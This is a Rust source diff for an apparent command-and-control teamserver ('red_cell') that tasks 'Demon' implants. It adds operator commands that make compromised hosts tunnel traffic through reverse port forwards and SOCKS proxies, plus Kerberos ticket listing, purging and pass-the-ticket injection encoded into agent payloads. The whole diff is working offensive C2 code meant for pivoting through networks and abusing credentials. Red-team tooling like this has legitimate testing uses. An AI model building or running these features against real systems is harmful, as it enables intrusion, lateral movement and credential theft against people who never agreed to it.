@@ -16,7 +16,8 @@ use base64::Engine as _;
 use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
 use red_cell_common::AgentInfo;
 use red_cell_common::demon::{
-    DemonCommand, DemonInjectWay, DemonProcessCommand, DemonTokenCommand,
+    DemonCommand, DemonInjectWay, DemonKerberosCommand, DemonProcessCommand, DemonSocketCommand,
+    DemonTokenCommand,
 };
 use red_cell_common::operator::{
     AgentEncryptionInfo as OperatorAgentEncryptionInfo, AgentInfo as OperatorAgentInfo,
@@ -31,9 +32,10 @@ use uuid::Uuid;
 
 use crate::{
     AgentRegistry, AuthError, AuthService, AuthenticationFailure, AuthenticationResult, EventBus,
-    Job, ListenerEventAction, ListenerManager, action_from_mark, authorize_websocket_command,
-    listener_config_from_operator, listener_error_event, listener_event_for_action,
-    listener_removed_event, login_failure_message, login_success_message, operator_requests_start,
+    Job, ListenerEventAction, ListenerManager, SocketRelayManager, action_from_mark,
+    authorize_websocket_command, listener_config_from_operator, listener_error_event,
+    listener_event_for_action, listener_removed_event, login_failure_message,
+    login_success_message, operator_requests_start,
 };
 
 /// Tracks currently connected operator WebSocket clients.
@@ -92,6 +94,7 @@ where
     EventBus: FromRef<S>,
     ListenerManager: FromRef<S>,
     AgentRegistry: FromRef<S>,
+    SocketRelayManager: FromRef<S>,
     OperatorConnectionManager: FromRef<S>,
 {
     Router::new().route("/", get(websocket_handler::<S>))
@@ -108,6 +111,7 @@ where
     EventBus: FromRef<S>,
     ListenerManager: FromRef<S>,
     AgentRegistry: FromRef<S>,
+    SocketRelayManager: FromRef<S>,
     OperatorConnectionManager: FromRef<S>,
 {
     websocket.on_upgrade(move |socket| handle_operator_socket(state, socket))
@@ -120,6 +124,7 @@ where
     EventBus: FromRef<S>,
     ListenerManager: FromRef<S>,
     AgentRegistry: FromRef<S>,
+    SocketRelayManager: FromRef<S>,
     OperatorConnectionManager: FromRef<S>,
 {
     let connection_id = Uuid::new_v4();
@@ -257,6 +262,7 @@ where
     EventBus: FromRef<S>,
     ListenerManager: FromRef<S>,
     AgentRegistry: FromRef<S>,
+    SocketRelayManager: FromRef<S>,
 {
     let Some(frame) = incoming else {
         return Ok(SocketLoopControl::Break);
@@ -335,10 +341,12 @@ async fn dispatch_operator_command<S>(
     EventBus: FromRef<S>,
     ListenerManager: FromRef<S>,
     AgentRegistry: FromRef<S>,
+    SocketRelayManager: FromRef<S>,
 {
     let events = EventBus::from_ref(state);
     let listeners = ListenerManager::from_ref(state);
     let registry = AgentRegistry::from_ref(state);
+    let sockets = SocketRelayManager::from_ref(state);
 
     match message {
         OperatorMessage::ListenerNew(message) => {
@@ -444,6 +452,7 @@ async fn dispatch_operator_command<S>(
         OperatorMessage::AgentTask(message) => {
             if let Err(error) = handle_agent_task(
                 &registry,
+                &sockets,
                 &events,
                 session,
                 sanitize_agent_task(session, message),
@@ -500,6 +509,10 @@ enum AgentCommandError {
     UnsupportedProcessSubcommand { subcommand: String },
     #[error("unsupported token subcommand `{subcommand}`")]
     UnsupportedTokenSubcommand { subcommand: String },
+    #[error("unsupported socket subcommand `{subcommand}`")]
+    UnsupportedSocketSubcommand { subcommand: String },
+    #[error("unsupported kerberos subcommand `{subcommand}`")]
+    UnsupportedKerberosSubcommand { subcommand: String },
     #[error("unsupported injection way `{way}`")]
     UnsupportedInjectionWay { way: String },
     #[error("unsupported injection technique `{technique}`")]
@@ -510,10 +523,13 @@ enum AgentCommandError {
     InvalidProcessCreateArguments,
     #[error(transparent)]
     Teamserver(#[from] crate::TeamserverError),
+    #[error(transparent)]
+    SocketRelay(#[from] crate::SocketRelayError),
 }
 
 async fn handle_agent_task(
     registry: &AgentRegistry,
+    sockets: &SocketRelayManager,
     events: &EventBus,
     session: &crate::OperatorSession,
     message: Message<red_cell_common::operator::AgentTaskInfo>,
@@ -524,6 +540,10 @@ async fn handle_agent_task(
 
     if let Some(note) = note_from_task(&message.info)? {
         registry.set_note(agent_id, note).await?;
+    } else if let Some(result) =
+        handle_teamserver_socket_task(sockets, agent_id, &message.info).await?
+    {
+        events.broadcast(teamserver_log_event(&session.username, &result));
     } else {
         registry.enqueue_job(agent_id, build_job(&message.info)?).await?;
     }
@@ -628,6 +648,14 @@ fn task_payload(
 
     if command == u32::from(DemonCommand::CommandToken) {
         return encode_token_payload(info);
+    }
+
+    if command == u32::from(DemonCommand::CommandSocket) {
+        return encode_socket_payload(info);
+    }
+
+    if command == u32::from(DemonCommand::CommandKerberos) {
+        return encode_kerberos_payload(info);
     }
 
     Ok(Vec::new())
@@ -813,6 +841,74 @@ fn encode_token_payload(
     Ok(payload)
 }
 
+fn encode_socket_payload(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<Vec<u8>, AgentCommandError> {
+    let command = socket_command(info)?;
+    let mut payload = Vec::new();
+    write_u32(&mut payload, command.0);
+
+    match command.1.as_str() {
+        "rportfwd add" => {
+            let params = required_string(info, &["Params", "Arguments"], "Params")?;
+            let parts = params.split(';').map(str::trim).collect::<Vec<_>>();
+            if parts.len() != 4 {
+                return Err(AgentCommandError::MissingField { field: "Params" });
+            }
+            write_u32(&mut payload, ipv4_to_u32(parts[0])?);
+            write_u32(&mut payload, parse_u32_field("Params[1]", parts[1])?);
+            write_u32(&mut payload, ipv4_to_u32(parts[2])?);
+            write_u32(&mut payload, parse_u32_field("Params[3]", parts[3])?);
+        }
+        "rportfwd remove" => {
+            let socket_id =
+                parse_hex_u32(&required_string(info, &["Params", "Arguments"], "Params")?)?;
+            write_u32(&mut payload, socket_id);
+        }
+        "rportfwd list" | "rportfwd clear" => {}
+        _ => return Err(AgentCommandError::UnsupportedSocketSubcommand { subcommand: command.1 }),
+    }
+
+    Ok(payload)
+}
+
+fn encode_kerberos_payload(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<Vec<u8>, AgentCommandError> {
+    let subcommand = kerberos_subcommand(info)?;
+    let mut payload = Vec::new();
+    write_u32(&mut payload, u32::from(subcommand));
+
+    match subcommand {
+        DemonKerberosCommand::Luid => {}
+        DemonKerberosCommand::Klist => {
+            let arg1 = required_string(info, &["Argument1", "Arguments"], "Argument1")?;
+            if arg1.eq_ignore_ascii_case("/all") {
+                write_u32(&mut payload, 0);
+            } else if arg1.eq_ignore_ascii_case("/luid") {
+                write_u32(&mut payload, 1);
+                let luid = parse_hex_u32(&required_string(info, &["Argument2"], "Argument2")?)?;
+                write_u32(&mut payload, luid);
+            } else {
+                return Err(AgentCommandError::UnsupportedKerberosSubcommand { subcommand: arg1 });
+            }
+        }
+        DemonKerberosCommand::Purge => {
+            let luid =
+                parse_hex_u32(&required_string(info, &["Argument", "Arguments"], "Argument")?)?;
+            write_u32(&mut payload, luid);
+        }
+        DemonKerberosCommand::Ptt => {
+            let ticket = decode_base64_required(info, &["Ticket"], "Ticket")?;
+            let luid = parse_hex_u32(&required_string(info, &["Luid"], "Luid")?)?;
+            write_len_prefixed_bytes(&mut payload, &ticket);
+            write_u32(&mut payload, luid);
+        }
+    }
+
+    Ok(payload)
+}
+
 fn proc_subcommand(
     info: &red_cell_common::operator::AgentTaskInfo,
 ) -> Result<DemonProcessCommand, AgentCommandError> {
@@ -838,6 +934,82 @@ fn token_subcommand(
         "1" | "impersonate" => Ok(DemonTokenCommand::Impersonate),
         _ => Err(AgentCommandError::UnsupportedTokenSubcommand { subcommand: raw }),
     }
+}
+
+fn socket_command(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<(u32, String), AgentCommandError> {
+    let raw = info
+        .command
+        .clone()
+        .or_else(|| flat_info_string_from_extra(&info.extra, &["Command"]))
+        .ok_or(AgentCommandError::MissingField { field: "Command" })?;
+    let normalized = raw.trim().to_ascii_lowercase();
+    let command = match normalized.as_str() {
+        "rportfwd add" => u32::from(DemonSocketCommand::ReversePortForwardAdd),
+        "rportfwd list" => u32::from(DemonSocketCommand::ReversePortForwardList),
+        "rportfwd remove" => u32::from(DemonSocketCommand::ReversePortForwardRemove),
+        "rportfwd clear" => u32::from(DemonSocketCommand::ReversePortForwardClear),
+        "socks add" | "socks list" | "socks kill" | "socks clear" => {
+            u32::from(DemonSocketCommand::SocksProxyAdd)
+        }
+        _ => {
+            return Err(AgentCommandError::UnsupportedSocketSubcommand { subcommand: raw });
+        }
+    };
+    Ok((command, normalized))
+}
+
+fn kerberos_subcommand(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<DemonKerberosCommand, AgentCommandError> {
+    let raw = info
+        .command
+        .clone()
+        .or_else(|| flat_info_string_from_extra(&info.extra, &["Command"]))
+        .ok_or(AgentCommandError::MissingField { field: "Command" })?;
+    match raw.trim().to_ascii_lowercase().as_str() {
+        "luid" => Ok(DemonKerberosCommand::Luid),
+        "klist" => Ok(DemonKerberosCommand::Klist),
+        "purge" => Ok(DemonKerberosCommand::Purge),
+        "ptt" => Ok(DemonKerberosCommand::Ptt),
+        _ => Err(AgentCommandError::UnsupportedKerberosSubcommand { subcommand: raw }),
+    }
+}
+
+async fn handle_teamserver_socket_task(
+    sockets: &SocketRelayManager,
+    agent_id: u32,
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<Option<String>, AgentCommandError> {
+    if info.command_id.trim() != u32::from(DemonCommand::CommandSocket).to_string() {
+        return Ok(None);
+    }
+
+    let (_, command) = socket_command(info)?;
+    let result = match command.as_str() {
+        "socks add" => Some(
+            sockets
+                .add_socks_server(
+                    agent_id,
+                    &required_string(info, &["Params", "Arguments"], "Params")?,
+                )
+                .await?,
+        ),
+        "socks list" => Some(sockets.list_socks_servers(agent_id).await),
+        "socks kill" => Some(
+            sockets
+                .remove_socks_server(
+                    agent_id,
+                    &required_string(info, &["Params", "Arguments"], "Params")?,
+                )
+                .await?,
+        ),
+        "socks clear" => Some(sockets.clear_socks_servers(agent_id).await?),
+        _ => None,
+    };
+
+    Ok(result)
 }
 
 fn parse_injection_way(value: &str) -> Result<DemonInjectWay, AgentCommandError> {
@@ -971,6 +1143,23 @@ fn parse_u32_field(field: &str, value: &str) -> Result<u32, AgentCommandError> {
         field: field.to_owned(),
         value: value.to_owned(),
     })
+}
+
+fn parse_hex_u32(value: &str) -> Result<u32, AgentCommandError> {
+    let trimmed = value.trim();
+    let trimmed =
+        trimmed.strip_prefix("0x").or_else(|| trimmed.strip_prefix("0X")).unwrap_or(trimmed);
+    u32::from_str_radix(trimmed, 16).map_err(|_| AgentCommandError::InvalidNumericField {
+        field: "hex".to_owned(),
+        value: value.to_owned(),
+    })
+}
+
+fn ipv4_to_u32(value: &str) -> Result<u32, AgentCommandError> {
+    let address = value.trim().parse::<std::net::Ipv4Addr>().map_err(|_| {
+        AgentCommandError::InvalidNumericField { field: "ip".to_owned(), value: value.to_owned() }
+    })?;
+    Ok(u32::from_le_bytes(address.octets()))
 }
 
 fn write_u32(buf: &mut Vec<u8>, value: u32) {
@@ -1154,7 +1343,10 @@ mod tests {
     use uuid::Uuid;
 
     use super::{OperatorConnectionManager, build_job, routes, teamserver_log_event};
-    use crate::{AgentRegistry, AuthService, Database, EventBus, ListenerManager, hash_password};
+    use crate::{
+        AgentRegistry, AuthService, Database, EventBus, ListenerManager, SocketRelayManager,
+        hash_password,
+    };
 
     #[derive(Clone)]
     struct TestState {
@@ -1163,6 +1355,7 @@ mod tests {
         connections: OperatorConnectionManager,
         registry: AgentRegistry,
         listeners: ListenerManager,
+        sockets: SocketRelayManager,
     }
 
     impl TestState {
@@ -1197,13 +1390,15 @@ mod tests {
             let database = Database::connect_in_memory().await.expect("database should initialize");
             let registry = AgentRegistry::new(database.clone());
             let events = EventBus::default();
+            let sockets = SocketRelayManager::new(registry.clone(), events.clone());
 
             Self {
                 auth: AuthService::from_profile(&profile),
                 events: events.clone(),
                 connections: OperatorConnectionManager::new(),
                 registry: registry.clone(),
-                listeners: ListenerManager::new(database, registry, events),
+                listeners: ListenerManager::new(database, registry, events, sockets.clone()),
+                sockets,
             }
         }
     }
@@ -1235,6 +1430,12 @@ mod tests {
     impl FromRef<TestState> for ListenerManager {
         fn from_ref(input: &TestState) -> Self {
             input.listeners.clone()
+        }
+    }
+
+    impl FromRef<TestState> for SocketRelayManager {
+        fn from_ref(input: &TestState) -> Self {
+            input.sockets.clone()
         }
     }
 
